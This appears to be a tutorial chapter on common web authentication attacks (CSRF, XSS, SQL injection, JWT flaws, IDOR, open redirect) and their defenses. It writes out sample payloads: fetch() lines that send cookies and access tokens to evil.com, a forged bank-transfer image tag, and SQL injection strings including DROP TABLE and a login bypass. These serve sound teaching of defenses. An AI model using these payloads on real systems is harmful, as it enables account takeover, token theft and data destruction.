# 08 — Common Attacks and How to Defend Against Them

## CSRF — Cross-Site Request Forgery

### What it is

CSRF tricks a user's browser into making requests they didn't intend.

You're logged in to your bank at `bank.com`. You visit a malicious site `evil.com`. That malicious site has:

```html
<img src="https://bank.com/transfer?to=attacker&amount=1000" />
```

Your browser loads that "image" URL. Since you're logged in to `bank.com`, your browser automatically sends your session cookie with the request. The bank receives a seemingly valid request from you and transfers the money.

You never clicked anything. You just visited a page.

### Why it works

Cookies are sent automatically on every request to the matching domain, regardless of which page initiated the request.

### Defenses

**1. SameSite cookie attribute** (primary modern defense)

```
Set-Cookie: session_id=abc; SameSite=Strict
```

With `SameSite=Strict`, cookies are only sent when navigating within the same site. Cross-site requests from `evil.com` will not include the cookie.

`SameSite=Lax` protects against cross-site POST (forms) but allows top-level navigations. Good default for most cases.

**2. CSRF tokens** (secondary, for legacy support)

A CSRF token is a random, unguessable value that:
- Is generated per session (or per form)
- Is embedded in every HTML form or included in request headers
- Is validated by the server on every state-changing request

```html
<form method="POST" action="/transfer">
  <input type="hidden" name="csrf_token" value="Kj29dPq7xBn3..." />
  ...
</form>
```

```javascript
// Server validation
if (req.body.csrf_token !== session.csrf_token) {
  return res.status(403).json({ error: "CSRF validation failed" });
}
```

An attacker on `evil.com` cannot read the CSRF token because the same-origin policy prevents cross-origin reads. They can make requests to your site, but they can't include the correct CSRF token.

**3. Check the Origin/Referer header**

State-changing endpoints can reject requests where the `Origin` header doesn't match your site. Not foolproof (headers can be absent) but useful as an extra layer.

---

## XSS — Cross-Site Scripting

### What it is

XSS allows attackers to inject malicious JavaScript into pages that other users see.

Types:
- **Stored XSS**: Attacker saves malicious content to your database (e.g., a comment). When other users view it, the script runs.
- **Reflected XSS**: Malicious script is in a URL parameter. The user is tricked into clicking a link, the script reflects off your server into the response.
- **DOM-based XSS**: JavaScript reads from dangerous sources (URL fragments, `document.cookie`) and writes to dangerous sinks (`innerHTML`, `eval()`).

### What an attacker does with it

```javascript
// Steal cookies (only works if HttpOnly is NOT set)
fetch("https://evil.com/steal?c=" + document.cookie);

// Steal localStorage tokens
fetch("https://evil.com/steal?t=" + localStorage.getItem("access_token"));

// Make authenticated requests as the victim
fetch("https://yourapp.com/api/transfer", {
  method: "POST",
  body: JSON.stringify({ to: "attacker", amount: 1000 }),
  credentials: "include"
});
```

### Defenses

**1. Output encoding** — the primary defense

Never render user-supplied content as raw HTML. Encode it first.

```javascript
// BAD — XSS vulnerable
element.innerHTML = userComment;

// GOOD — XSS safe
element.textContent = userComment;
// or
element.innerHTML = escapeHtml(userComment);
```

Modern frameworks (React, Vue, Angular) escape by default. Be careful when using `dangerouslySetInnerHTML` (React) or `v-html` (Vue) — these bypass the protection.

**2. Content Security Policy (CSP)**

CSP is an HTTP header that tells the browser which scripts are allowed to execute:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

With a strict CSP, even if an attacker injects a `<script>` tag, the browser refuses to execute it because it's not from an allowed source.

**3. HttpOnly cookies**

If your session token is in an HttpOnly cookie, JavaScript can't read it — so even a successful XSS attack can't steal the session cookie. This is why HttpOnly matters so much.

**4. Input validation**

Validate inputs on the server. Reject HTML where you expect plain text. But don't rely on this alone — output encoding is the real defense.

---

## Session Hijacking

### What it is

An attacker obtains a valid session ID or token and uses it to impersonate the user.

Methods:
- **Network sniffing**: If HTTP (not HTTPS) is used, session IDs travel in plain text
- **XSS**: JavaScript steals the session cookie (if not HttpOnly)
- **Predictable session IDs**: IDs that can be guessed or enumerated
- **Database leaks**: Session table leaked, attacker uses tokens directly
- **Physical access**: Someone looks over your shoulder or at an unattended screen

### Defenses

- **Always use HTTPS** with `Secure` cookies — prevents network sniffing
- **HttpOnly cookies** — prevents XSS-based theft
- **Cryptographically random session IDs** (128+ bits) — prevents guessing
- **Session expiry** — limits the window of opportunity
- **Rotate session ID on privilege change** — re-authenticate for sensitive operations

---

## SQL Injection (affects auth systems)

### What it is

If user input is inserted directly into SQL queries, an attacker can escape the query and execute arbitrary SQL.

```python
# BAD — vulnerable
query = f"SELECT * FROM users WHERE email = '{email}'"
# If email = "' OR '1'='1" → returns all users
# If email = "'; DROP TABLE users; --" → deletes the table
```

In auth systems, this can bypass login entirely:

```python
# Attacker enters:
email = "admin@example.com' --"
password = "anything"

# Query becomes:
"SELECT * FROM users WHERE email = 'admin@example.com' --' AND password_hash = '...'"
# The -- comments out the password check!
```

### Defense

**Always use parameterized queries (prepared statements):**

```python
# GOOD — safe
cursor.execute(
  "SELECT * FROM users WHERE email = %s",
  (email,)
)
```

The database handles escaping. The input can never change the query structure.

ORMs generally do this correctly, but watch out for raw query methods.

---

## Brute Force and Credential Stuffing

### Brute force

Trying many passwords against a single account.

Defenses:
- **Rate limiting** — max N attempts per IP per time window before lockout
- **Account lockout** — temporarily lock account after N failed attempts
- **Progressive delays** — each failed attempt adds delay before next is allowed
- **CAPTCHA** — after N failures, require a CAPTCHA
- **Alert on suspicious activity** — email the account owner about failed attempts

⚠️ Account lockout can itself be a DoS attack (lock everyone out). A delay-based approach is safer.

### Credential stuffing

Using leaked username/password pairs from other breaches to try to log in to your service. Effective because many people reuse passwords.

Defenses:
- **Check passwords against breach databases** (HaveIBeenPwned API)
- **MFA** — even if credentials are correct, attacker doesn't have the second factor
- **Anomaly detection** — flag logins from new devices/locations
- **Rate limiting by username, not just IP** — attackers use many IPs

---

## Token Theft and Replay Attacks

### Token theft

Stealing a valid token (JWT, session ID) and using it directly.

Already covered in XSS and session hijacking above. Key defenses:
- Short-lived access tokens (15 minutes)
- HttpOnly cookies
- HTTPS everywhere
- Token rotation for refresh tokens

### Replay attacks

Capturing a valid token in transit and reusing it.

Defenses:
- **HTTPS** — prevents interception
- **Short expiry** — captured tokens expire quickly
- **One-time tokens** — for truly sensitive operations (OTPs, email confirmation links), use tokens that are valid exactly once and invalidate after use

---

## JWT-Specific Attacks

### Algorithm confusion (RS256 → HS256)

A library configured for RS256 (asymmetric) receives a token with `"alg": "HS256"`. If the library is buggy, it may verify the signature using the public key as the HMAC secret. The attacker, knowing the public key (it's public!), can forge valid tokens.

Defense: explicitly specify which algorithms you accept. Reject anything else.

### `none` algorithm

Set `"alg": "none"` and omit the signature. Some old libraries accept this.

Defense: never accept `"alg": "none"`. Always require a specific algorithm.

### JWT secret brute force

If using HS256 with a short or weak secret, attackers can brute-force the secret from a captured token.

Defense: use secrets of at least 256 bits. Or switch to RS256/ES256.

### Signature strip

Old vulnerability: some libraries verified the signature of JWTs with the wrong key and still accepted them if the structure was valid.

Defense: always use a well-maintained JWT library and keep it updated.

---

## IDOR — Insecure Direct Object Reference

Not just about auth, but commonly an auth failure.

```
GET /api/invoices/10042  → Returns invoice 10042
```

If the server doesn't check that the requesting user owns invoice 10042, an attacker can:

```
GET /api/invoices/10041
GET /api/invoices/10040
GET /api/invoices/10039
```

...and read everyone's invoices by incrementing the ID.

Defense: Always verify the requesting user is authorized to access the specific resource by ID — don't just check that they're authenticated.

---

## Open Redirect

Your auth flow redirects users to a `redirect_uri` after login:

```
https://yourapp.com/login?redirect=https://yourapp.com/dashboard
```

If you don't validate the `redirect` parameter, an attacker can use:

```
https://yourapp.com/login?redirect=https://evil.com
```

Phishing scenario: "Click here to log in" → lands on real login page → after login, redirected to attacker's site.

In OAuth flows, this is especially dangerous — an open redirect on the client can redirect authorization codes to the attacker.

Defense: Whitelist allowed redirect destinations. Only redirect to your own domain or explicitly registered redirect URIs.

---

## Defense in Depth

No single control is perfect. Layer your defenses:

```
Network layer:   HTTPS, TLS, network-level WAF
Application:     Input validation, output encoding, CSP
Auth:            Short-lived tokens, HttpOnly, SameSite, MFA
API:             Rate limiting, authorization checks on every endpoint
Monitoring:      Log all auth events, alert on anomalies
Incident:        Have a revocation plan, know how to respond to a breach
```

An attacker who bypasses one layer should still be stopped by the next.

---

## Next

Modern approaches to auth go beyond passwords — passkeys, MFA, magic links, and SSO: `09-modern-patterns.md`
